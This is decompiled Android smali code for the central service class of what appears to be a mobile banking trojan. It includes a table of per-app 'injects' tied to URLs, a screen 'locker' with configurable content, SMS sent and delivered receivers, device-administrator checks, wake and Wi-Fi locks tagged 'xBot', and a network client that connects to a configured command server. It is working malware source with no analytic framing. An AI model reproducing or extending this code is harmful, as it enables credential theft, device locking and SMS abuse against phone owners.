.class public Lorg/luckybird/core/RunService;
.super Landroid/app/Service;
.source "RunService.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lorg/luckybird/core/RunService$RunBinder;
    }
.end annotation


# static fields
.field private static _actmgr:Landroid/app/ActivityManager;

.field private static _alarm:Landroid/app/AlarmManager;

.field private static _api:Lorg/luckybird/core/xAPI;

.field private static _connectivity:Landroid/net/ConnectivityManager;

.field private static _hash:Ljava/lang/String;

.field private static _injects:Ljava/util/HashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/HashMap",
            "<",
            "Ljava/lang/String;",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private static _keyguard:Landroid/app/KeyguardManager;

.field private static _loader:Lorg/luckybird/core/ScriptLoader;

.field private static _notify:Landroid/app/NotificationManager;

.field private static _pm:Landroid/os/PowerManager;

.field private static _policy:Landroid/app/admin/DevicePolicyManager;

.field private static _queue:Ljava/util/Queue;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/Queue",
            "<",
            "Ljava/lang/Object;",
            ">;"
        }
    .end annotation
.end field

.field private static _service:Lorg/luckybird/core/RunService;

.field private static _settings:Lorg/luckybird/core/Settings;

.field private static _started:Ljava/lang/Boolean;

.field private static _telemgr:Landroid/telephony/TelephonyManager;

.field private static _wakeLock:Landroid/os/PowerManager$WakeLock;

.field private static _wifilock:Landroid/net/wifi/WifiManager$WifiLock;

.field private static _wifimgr:Landroid/net/wifi/WifiManager;

.field private static bootScript:Ljava/lang/String;

.field private static bootScriptLoaded:Ljava/lang/Boolean;

.field private static currentWindow:Ljava/lang/String;

.field public static onTickHandler:Landroid/os/Handler;


# instance fields
.field _client:Lcom/esotericsoftware/kryonet/Client;

.field _sms_delivered_receiver:Lorg/luckybird/core/sms/DeliveredReceiver;

.field _sms_handler:Lorg/luckybird/core/SMSHandler;

.field _sms_sent_receiver:Lorg/luckybird/core/sms/SentReceiver;

.field private final mBinder:Landroid/os/IBinder;


# direct methods
.method static constructor <clinit>()V
    .locals 3

    .prologue
    const/4 v2, 0x0

    const/4 v1, 0x0

    .line 67
    sput-object v1, Lorg/luckybird/core/RunService;->_service:Lorg/luckybird/core/RunService;

    .line 68
    sput-object v1, Lorg/luckybird/core/RunService;->_api:Lorg/luckybird/core/xAPI;

    .line 71
    sput-object v1, Lorg/luckybird/core/RunService;->_pm:Landroid/os/PowerManager;

    .line 72
    sput-object v1, Lorg/luckybird/core/RunService;->_telemgr:Landroid/telephony/TelephonyManager;

    .line 73
    sput-object v1, Lorg/luckybird/core/RunService;->_actmgr:Landroid/app/ActivityManager;

    .line 74
    sput-object v1, Lorg/luckybird/core/RunService;->_keyguard:Landroid/app/KeyguardManager;

    .line 75
    sput-object v1, Lorg/luckybird/core/RunService;->_notify:Landroid/app/NotificationManager;

    .line 76
    sput-object v1, Lorg/luckybird/core/RunService;->_policy:Landroid/app/admin/DevicePolicyManager;

    .line 77
    sput-object v1, Lorg/luckybird/core/RunService;->_connectivity:Landroid/net/ConnectivityManager;

    .line 78
    sput-object v1, Lorg/luckybird/core/RunService;->_wifimgr:Landroid/net/wifi/WifiManager;

    .line 79
    sput-object v1, Lorg/luckybird/core/RunService;->_alarm:Landroid/app/AlarmManager;

    .line 87
    sput-object v1, Lorg/luckybird/core/RunService;->_settings:Lorg/luckybird/core/Settings;

    .line 88
    sput-object v1, Lorg/luckybird/core/RunService;->_loader:Lorg/luckybird/core/ScriptLoader;

    .line 89
    const-string v0, ""

    sput-object v0, Lorg/luckybird/core/RunService;->_hash:Ljava/lang/String;

    .line 90
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lorg/luckybird/core/RunService;->_started:Ljava/lang/Boolean;

    .line 91
    const-string v0, "111"

    sput-object v0, Lorg/luckybird/core/RunService;->currentWindow:Ljava/lang/String;

    .line 92
    sput-object v1, Lorg/luckybird/core/RunService;->_wakeLock:Landroid/os/PowerManager$WakeLock;

    .line 93
    sput-object v1, Lorg/luckybird/core/RunService;->_wifilock:Landroid/net/wifi/WifiManager$WifiLock;

    .line 95
    const-string v0, ""

    sput-object v0, Lorg/luckybird/core/RunService;->bootScript:Ljava/lang/String;

    .line 96
    new-instance v0, Ljava/util/LinkedList;

    invoke-direct {v0}, Ljava/util/LinkedList;-><init>()V

    sput-object v0, Lorg/luckybird/core/RunService;->_queue:Ljava/util/Queue;

    .line 97
    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    sput-object v0, Lorg/luckybird/core/RunService;->_injects:Ljava/util/HashMap;

    .line 98
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lorg/luckybird/core/RunService;->bootScriptLoaded:Ljava/lang/Boolean;

    .line 322
    new-instance v0, Lorg/luckybird/core/RunService$1;

    invoke-direct {v0}, Lorg/luckybird/core/RunService$1;-><init>()V

    sput-object v0, Lorg/luckybird/core/RunService;->onTickHandler:Landroid/os/Handler;

    return-void
.end method

.method public constructor <init>()V
    .locals 2

    .prologue
    const v1, 0xffff

    .line 63
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 65
    new-instance v0, Lorg/luckybird/core/RunService$RunBinder;

    invoke-direct {v0, p0}, Lorg/luckybird/core/RunService$RunBinder;-><init>(Lorg/luckybird/core/RunService;)V

    iput-object v0, p0, Lorg/luckybird/core/RunService;->mBinder:Landroid/os/IBinder;

    .line 83
    new-instance v0, Lorg/luckybird/core/SMSHandler;

    invoke-direct {v0}, Lorg/luckybird/core/SMSHandler;-><init>()V

    iput-object v0, p0, Lorg/luckybird/core/RunService;->_sms_handler:Lorg/luckybird/core/SMSHandler;

    .line 84
    new-instance v0, Lorg/luckybird/core/sms/SentReceiver;

    invoke-direct {v0}, Lorg/luckybird/core/sms/SentReceiver;-><init>()V

    iput-object v0, p0, Lorg/luckybird/core/RunService;->_sms_sent_receiver:Lorg/luckybird/core/sms/SentReceiver;

    .line 85
    new-instance v0, Lorg/luckybird/core/sms/DeliveredReceiver;

    invoke-direct {v0}, Lorg/luckybird/core/sms/DeliveredReceiver;-><init>()V

    iput-object v0, p0, Lorg/luckybird/core/RunService;->_sms_delivered_receiver:Lorg/luckybird/core/sms/DeliveredReceiver;

    .line 94
    new-instance v0, Lcom/esotericsoftware/kryonet/Client;

    invoke-direct {v0, v1, v1}, Lcom/esotericsoftware/kryonet/Client;-><init>(II)V

    iput-object v0, p0, Lorg/luckybird/core/RunService;->_client:Lcom/esotericsoftware/kryonet/Client;

    .line 100
    return-void
.end method

.method static synthetic access$000()Ljava/lang/String;
    .locals 1

    .prologue
    .line 63
    sget-object v0, Lorg/luckybird/core/RunService;->currentWindow:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$002(Ljava/lang/String;)Ljava/lang/String;
    .locals 0
    .param p0, "x0"    # Ljava/lang/String;

    .prologue
    .line 63
    sput-object p0, Lorg/luckybird/core/RunService;->currentWindow:Ljava/lang/String;

    return-object p0
.end method

.method static synthetic access$100()Ljava/util/HashMap;
    .locals 1

    .prologue
    .line 63
    sget-object v0, Lorg/luckybird/core/RunService;->_injects:Ljava/util/HashMap;

    return-object v0
.end method

.method static synthetic access$200()Lorg/luckybird/core/xAPI;
    .locals 1

    .prologue
    .line 63
    sget-object v0, Lorg/luckybird/core/RunService;->_api:Lorg/luckybird/core/xAPI;

    return-object v0
.end method

.method static synthetic access$300()Ljava/lang/String;
    .locals 1

    .prologue
    .line 63
    sget-object v0, Lorg/luckybird/core/RunService;->bootScript:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$302(Ljava/lang/String;)Ljava/lang/String;
    .locals 0
    .param p0, "x0"    # Ljava/lang/String;

    .prologue
    .line 63
    sput-object p0, Lorg/luckybird/core/RunService;->bootScript:Ljava/lang/String;

    return-object p0
.end method

.method static synthetic access$400()Ljava/lang/Boolean;
    .locals 1

    .prologue
    .line 63
    sget-object v0, Lorg/luckybird/core/RunService;->bootScriptLoaded:Ljava/lang/Boolean;

    return-object v0
.end method

.method static synthetic access$402(Ljava/lang/Boolean;)Ljava/lang/Boolean;
    .locals 0
    .param p0, "x0"    # Ljava/lang/Boolean;

    .prologue
    .line 63
    sput-object p0, Lorg/luckybird/core/RunService;->bootScriptLoaded:Ljava/lang/Boolean;

    return-object p0
.end method

.method static synthetic access$500()Ljava/util/Queue;
    .locals 1

    .prologue
    .line 63
    sget-object v0, Lorg/luckybird/core/RunService;->_queue:Ljava/util/Queue;

    return-object v0
.end method

.method static synthetic access$600()Landroid/os/PowerManager$WakeLock;
    .locals 1

    .prologue
    .line 63
    sget-object v0, Lorg/luckybird/core/RunService;->_wakeLock:Landroid/os/PowerManager$WakeLock;

    return-object v0
.end method

.method static synthetic access$602(Landroid/os/PowerManager$WakeLock;)Landroid/os/PowerManager$WakeLock;
    .locals 0
    .param p0, "x0"    # Landroid/os/PowerManager$WakeLock;

    .prologue
    .line 63
    sput-object p0, Lorg/luckybird/core/RunService;->_wakeLock:Landroid/os/PowerManager$WakeLock;

    return-object p0
.end method

.method static synthetic access$700()Landroid/os/PowerManager;
    .locals 1

    .prologue
    .line 63
    sget-object v0, Lorg/luckybird/core/RunService;->_pm:Landroid/os/PowerManager;

    return-object v0
.end method

.method public static getService()Lorg/luckybird/core/RunService;
    .locals 1

    .prologue
    .line 108
    sget-object v0, Lorg/luckybird/core/RunService;->_service:Lorg/luckybird/core/RunService;

    return-object v0
.end method

.method public static isStarted()Ljava/lang/Boolean;
    .locals 1

    .prologue
    .line 179
    sget-object v0, Lorg/luckybird/core/RunService;->_started:Ljava/lang/Boolean;

    return-object v0
.end method

.method public static readRawTextFile(Landroid/content/Context;I)Ljava/lang/String;
    .locals 7
    .param p0, "ctx"    # Landroid/content/Context;
    .param p1, "resId"    # I

    .prologue
    .line 618
    invoke-virtual {p0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v6

    invoke-virtual {v6, p1}, Landroid/content/res/Resources;->openRawResource(I)Ljava/io/InputStream;

    move-result-object v2

    .line 620
    .local v2, "inputStream":Ljava/io/InputStream;
    new-instance v3, Ljava/io/InputStreamReader;

    invoke-direct {v3, v2}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    .line 621
    .local v3, "inputreader":Ljava/io/InputStreamReader;
    new-instance v0, Ljava/io/BufferedReader;

    invoke-direct {v0, v3}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 623
    .local v0, "buffreader":Ljava/io/BufferedReader;
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    .line 626
    .local v5, "text":Ljava/lang/StringBuilder;
    :goto_0
    :try_start_0
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v4

    .local v4, "line":Ljava/lang/String;
    if-eqz v4, :cond_0

    .line 627
    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 628
    const/16 v6, 0xa

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 630
    .end local v4    # "line":Ljava/lang/String;
    :catch_0
    move-exception v1

    .line 631
    .local v1, "e":Ljava/lang/Exception;
    const/4 v6, 0x0

    .line 633
    .end local v1    # "e":Ljava/lang/Exception;
    :goto_1
    return-object v6

    .restart local v4    # "line":Ljava/lang/String;
    :cond_0
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    goto :goto_1
.end method


# virtual methods
.method public addInject(Ljava/lang/String;Ljava/lang/String;)V
    .locals 2
    .param p1, "pkg"    # Ljava/lang/String;
    .param p2, "url"    # Ljava/lang/String;

    .prologue
    .line 239
    sget-object v0, Lorg/luckybird/core/RunService;->_injects:Ljava/util/HashMap;

    invoke-virtual {v0, p1}, Ljava/util/HashMap;->containsKey(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 241
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "Added inject: "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, " . "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lorg/luckybird/core/Log;->write(Ljava/lang/String;)V

    .line 242
    sget-object v0, Lorg/luckybird/core/RunService;->_injects:Ljava/util/HashMap;

    invoke-virtual {v0, p1, p2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 244
    :cond_0
    return-void
.end method

.method public disableInject(Ljava/lang/String;)V
    .locals 3
    .param p1, "pkg"    # Ljava/lang/String;

    .prologue
    .line 248
    invoke-virtual {p0}, Lorg/luckybird/core/RunService;->getSettings()Lorg/luckybird/core/Settings;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, ".inject"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const-string v2, "false"

    invoke-virtual {v0, v1, v2}, Lorg/luckybird/core/Settings;->set(Ljava/lang/String;Ljava/lang/String;)V

    .line 249
    return-void
.end method

.method public disableLocker()V
    .locals 3

    .prologue
    .line 258
    invoke-virtual {p0}, Lorg/luckybird/core/RunService;->getSettings()Lorg/luckybird/core/Settings;

    move-result-object v0

    const-string v1, "locker"

    const-string v2, "false"

    invoke-virtual {v0, v1, v2}, Lorg/luckybird/core/Settings;->set(Ljava/lang/String;Ljava/lang/String;)V

    .line 259
    return-void
.end method

.method public enableInject(Ljava/lang/String;)V
    .locals 3
    .param p1, "pkg"    # Ljava/lang/String;

    .prologue
    .line 253
    invoke-virtual {p0}, Lorg/luckybird/core/RunService;->getSettings()Lorg/luckybird/core/Settings;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, ".inject"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const-string v2, "true"

    invoke-virtual {v0, v1, v2}, Lorg/luckybird/core/Settings;->set(Ljava/lang/String;Ljava/lang/String;)V

    .line 254
    return-void
.end method

.method public enableLocker()V
    .locals 3

    .prologue
    .line 263
    invoke-virtual {p0}, Lorg/luckybird/core/RunService;->getSettings()Lorg/luckybird/core/Settings;

    move-result-object v0

    const-string v1, "locker"

    const-string v2, "true"

    invoke-virtual {v0, v1, v2}, Lorg/luckybird/core/Settings;->set(Ljava/lang/String;Ljava/lang/String;)V

    .line 264
    return-void
.end method

.method public getAPI()Lorg/luckybird/core/xAPI;
    .locals 1

    .prologue
    .line 158
    sget-object v0, Lorg/luckybird/core/RunService;->_api:Lorg/luckybird/core/xAPI;

    return-object v0
.end method

.method public getActivityManager()Landroid/app/ActivityManager;
    .locals 1

    .prologue
    .line 123
    sget-object v0, Lorg/luckybird/core/RunService;->_actmgr:Landroid/app/ActivityManager;

    return-object v0
.end method

.method public getAlarmManager()Landroid/app/AlarmManager;
    .locals 1

    .prologue
    .line 153
    sget-object v0, Lorg/luckybird/core/RunService;->_alarm:Landroid/app/AlarmManager;

    return-object v0
.end method

.method public getConnectivityManager()Landroid/net/ConnectivityManager;
    .locals 1

    .prologue
    .line 143
    sget-object v0, Lorg/luckybird/core/RunService;->_connectivity:Landroid/net/ConnectivityManager;

    return-object v0
.end method

.method public getDeviceID()Ljava/lang/String;
    .locals 2

    .prologue
    .line 657
    sget-object v0, Lorg/luckybird/core/RunService;->_api:Lorg/luckybird/core/xAPI;

    invoke-virtual {v0}, Lorg/luckybird/core/xAPI;->getTelephonyInfo()[Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    aget-object v0, v0, v1

    return-object v0
.end method

.method public getKeyguardManager()Landroid/app/KeyguardManager;
    .locals 1

    .prologue
    .line 128
    sget-object v0, Lorg/luckybird/core/RunService;->_keyguard:Landroid/app/KeyguardManager;

    return-object v0
.end method

.method public getLockerContent()Ljava/lang/String;
    .locals 2

    .prologue
    .line 287
    invoke-virtual {p0}, Lorg/luckybird/core/RunService;->getSettings()Lorg/luckybird/core/Settings;

    move-result-object v0

    const-string v1, "lockerContent"

    invoke-virtual {v0, v1}, Lorg/luckybird/core/Settings;->get(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public getNetClient()Lcom/esotericsoftware/kryonet/Client;
    .locals 1

    .prologue
    .line 184
    iget-object v0, p0, Lorg/luckybird/core/RunService;->_client:Lcom/esotericsoftware/kryonet/Client;

    return-object v0
.end method

.method public getNotificationManager()Landroid/app/NotificationManager;
    .locals 1

    .prologue
    .line 133
    sget-object v0, Lorg/luckybird/core/RunService;->_notify:Landroid/app/NotificationManager;

    return-object v0
.end method

.method public getOnTickHandler()Landroid/os/Handler;
    .locals 1

    .prologue
    .line 174
    sget-object v0, Lorg/luckybird/core/RunService;->onTickHandler:Landroid/os/Handler;

    return-object v0
.end method

.method public getPolicyManager()Landroid/app/admin/DevicePolicyManager;
    .locals 1

    .prologue
    .line 138
    sget-object v0, Lorg/luckybird/core/RunService;->_policy:Landroid/app/admin/DevicePolicyManager;

    return-object v0
.end method

.method public getPowerManager()Landroid/os/PowerManager;
    .locals 1

    .prologue
    .line 113
    sget-object v0, Lorg/luckybird/core/RunService;->_pm:Landroid/os/PowerManager;

    return-object v0
.end method

.method public getScriptLoader()Lorg/luckybird/core/ScriptLoader;
    .locals 1

    .prologue
    .line 168
    sget-object v0, Lorg/luckybird/core/RunService;->_loader:Lorg/luckybird/core/ScriptLoader;

    return-object v0
.end method

.method public getSettings()Lorg/luckybird/core/Settings;
    .locals 1

    .prologue
    .line 163
    sget-object v0, Lorg/luckybird/core/RunService;->_settings:Lorg/luckybird/core/Settings;

    return-object v0
.end method

.method public getTeleManager()Landroid/telephony/TelephonyManager;
    .locals 1

    .prologue
    .line 118
    sget-object v0, Lorg/luckybird/core/RunService;->_telemgr:Landroid/telephony/TelephonyManager;

    return-object v0
.end method

.method public getTrafferId()I
    .locals 1

    .prologue
    .line 189
    sget v0, Lorg/luckybird/core/Consts;->trafferName:I

    return v0
.end method

.method public getWifiManager()Landroid/net/wifi/WifiManager;
    .locals 1

    .prologue
    .line 148
    sget-object v0, Lorg/luckybird/core/RunService;->_wifimgr:Landroid/net/wifi/WifiManager;

    return-object v0
.end method

.method public isAdminActive()Ljava/lang/Boolean;
    .locals 4

    .prologue
    .line 319
    invoke-static {}, Lorg/luckybird/core/RunService;->getService()Lorg/luckybird/core/RunService;

    move-result-object v0

    invoke-virtual {v0}, Lorg/luckybird/core/RunService;->getPolicyManager()Landroid/app/admin/DevicePolicyManager;

    move-result-object v0

    new-instance v1, Landroid/content/ComponentName;

    invoke-static {}, Lorg/luckybird/core/RunService;->getService()Lorg/luckybird/core/RunService;

    move-result-object v2

    const-class v3, Lorg/luckybird/core/AdminReceiver;

    invoke-direct {v1, v2, v3}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    return-object v0
.end method

.method public isLockerContentData()Ljava/lang/Boolean;
    .locals 2

    .prologue
    .line 282
    invoke-virtual {p0}, Lorg/luckybird/core/RunService;->getSettings()Lorg/luckybird/core/Settings;

    move-result-object v0

    const-string v1, "lockerContentType"

    invoke-virtual {v0, v1}, Lorg/luckybird/core/Settings;->get(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "data"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    return-object v0
.end method

.method public isLockerEnabled()Ljava/lang/Boolean;
    .locals 2

    .prologue
    .line 268
    invoke-virtual {p0}, Lorg/luckybird/core/RunService;->getSettings()Lorg/luckybird/core/Settings;

    move-result-object v0

    const-string v1, "locker"

    invoke-virtual {v0, v1}, Lorg/luckybird/core/Settings;->get(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "false"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    const/4 v0, 0x1

    :goto_0
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    return-object v0

    :cond_0
    const/4 v0, 0x0

    goto :goto_0
.end method

.method public lockWifi()V
    .locals 3

    .prologue
    .line 663
    sget-object v0, Lorg/luckybird/core/RunService;->_wifilock:Landroid/net/wifi/WifiManager$WifiLock;

    if-eqz v0, :cond_0

    sget-object v0, Lorg/luckybird/core/RunService;->_wifilock:Landroid/net/wifi/WifiManager$WifiLock;

    invoke-virtual {v0}, Landroid/net/wifi/WifiManager$WifiLock;->isHeld()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 665
    sget-object v0, Lorg/luckybird/core/RunService;->_wifilock:Landroid/net/wifi/WifiManager$WifiLock;

    invoke-virtual {v0}, Landroid/net/wifi/WifiManager$WifiLock;->release()V

    .line 666
    const/4 v0, 0x0

    sput-object v0, Lorg/luckybird/core/RunService;->_wifilock:Landroid/net/wifi/WifiManager$WifiLock;

    .line 668
    :cond_0
    sget-object v0, Lorg/luckybird/core/RunService;->_wifimgr:Landroid/net/wifi/WifiManager;

    const/4 v1, 0x1

    const-string v2, "xBot"

    invoke-virtual {v0, v1, v2}, Landroid/net/wifi/WifiManager;->createWifiLock(ILjava/lang/String;)Landroid/net/wifi/WifiManager$WifiLock;

    move-result-object v0

    sput-object v0, Lorg/luckybird/core/RunService;->_wifilock:Landroid/net/wifi/WifiManager$WifiLock;

    .line 670
    sget-object v0, Lorg/luckybird/core/RunService;->_wifilock:Landroid/net/wifi/WifiManager$WifiLock;

    invoke-virtual {v0}, Landroid/net/wifi/WifiManager$WifiLock;->acquire()V

    .line 671
    return-void
.end method

.method public netConnect()V
    .locals 5

    .prologue
    .line 593
    :try_start_0
    iget-object v1, p0, Lorg/luckybird/core/RunService;->_client:Lcom/esotericsoftware/kryonet/Client;

    invoke-virtual {v1}, Lcom/esotericsoftware/kryonet/Client;->isConnected()Z

    move-result v1

    if-nez v1, :cond_0

    .line 595
    iget-object v1, p0, Lorg/luckybird/core/RunService;->_client:Lcom/esotericsoftware/kryonet/Client;

    const/16 v2, 0x2710

    sget-object v3, Lorg/luckybird/core/Consts;->serverAddress:Ljava/lang/String;

    const/16 v4, 0x1f55

    invoke-virtual {v1, v2, v3, v4}, Lcom/esotericsoftware/kryonet/Client;->connect(ILjava/lang/String;I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 604
    :cond_0
    :goto_0
    return-void

    .line 600
    :catch_0
    move-exception v0

    .line 602
    .local v0, "e":Ljava/lang/Exception;
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Can\'t connect to KryoNet server: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lorg/luckybird/core/Log;->write(Ljava/lang/String;)V

    goto :goto_0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 638
    iget-object v0, p0, Lorg/luckybird/core/RunService;->mBinder:Landroid/os/IBinder;

    return-object v0
.end method

.method public onCreate()V
    .locals 3

    .prologue
    .line 299
    sput-object p0, Lorg/luckybird/core/RunService;->_service:Lorg/luckybird/core/RunService;

    .line 301
    const-string v0, "power"

    invoke-virtual {p0, v0}, Lorg/luckybird/core/RunService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/os/PowerManager;

    sput-object v0, Lorg/luckybird/core/RunService;->_pm:Landroid/os/PowerManager;

    .line 302
    const-string v0, "phone"

    invoke-virtual {p0, v0}, Lorg/luckybird/core/RunService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    sput-object v0, Lorg/luckybird/core/RunService;->_telemgr:Landroid/telephony/TelephonyManager;

    .line 303
    const-string v0, "activity"

    invoke-virtual {p0, v0}, Lorg/luckybird/core/RunService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager;

    sput-object v0, Lorg/luckybird/core/RunService;->_actmgr:Landroid/app/ActivityManager;

    .line 304
    const-string v0, "keyguard"

    invoke-virtual {p0, v0}, Lorg/luckybird/core/RunService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/KeyguardManager;

    sput-object v0, Lorg/luckybird/core/RunService;->_keyguard:Landroid/app/KeyguardManager;

    .line 305
    const-string v0, "notification"

    invoke-virtual {p0, v0}, Lorg/luckybird/core/RunService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/NotificationManager;

    sput-object v0, Lorg/luckybird/core/RunService;->_notify:Landroid/app/NotificationManager;

    .line 306
    const-string v0, "device_policy"

    invoke-virtual {p0, v0}, Lorg/luckybird/core/RunService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    sput-object v0, Lorg/luckybird/core/RunService;->_policy:Landroid/app/admin/DevicePolicyManager;

    .line 307
    const-string v0, "connectivity"

    invoke-virtual {p0, v0}, Lorg/luckybird/core/RunService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/ConnectivityManager;

    sput-object v0, Lorg/luckybird/core/RunService;->_connectivity:Landroid/net/ConnectivityManager;

    .line 308
    const-string v0, "wifi"

    invoke-virtual {p0, v0}, Lorg/luckybird/core/RunService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/wifi/WifiManager;

    sput-object v0, Lorg/luckybird/core/RunService;->_wifimgr:Landroid/net/wifi/WifiManager;

    .line 309
    const-string v0, "alarm"

    invoke-virtual {p0, v0}, Lorg/luckybird/core/RunService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    sput-object v0, Lorg/luckybird/core/RunService;->_alarm:Landroid/app/AlarmManager;

    .line 311
    iget-object v0, p0, Lorg/luckybird/core/RunService;->_sms_sent_receiver:Lorg/luckybird/core/sms/SentReceiver;

    new-instance v1, Landroid/content/IntentFilter;

    const-string v2, "SMS_SENT"

    invoke-direct {v1, v2}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v0, v1}, Lorg/luckybird/core/RunService;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 312
    iget-object v0, p0, Lorg/luckybird/core/RunService;->_sms_delivered_receiver:Lorg/luckybird/core/sms/DeliveredReceiver;

    new-instance v1, Landroid/content/IntentFilter;

    const-string v2, "SMS_DELIVERED"

    invoke-direct {v1, v2}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v0, v1}, Lorg/luckybird/core/RunService;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 315
    return-void
.end method

.method public onDestroy()V
    .locals 0

    .prologue
    .line 614
    return-void
.end method

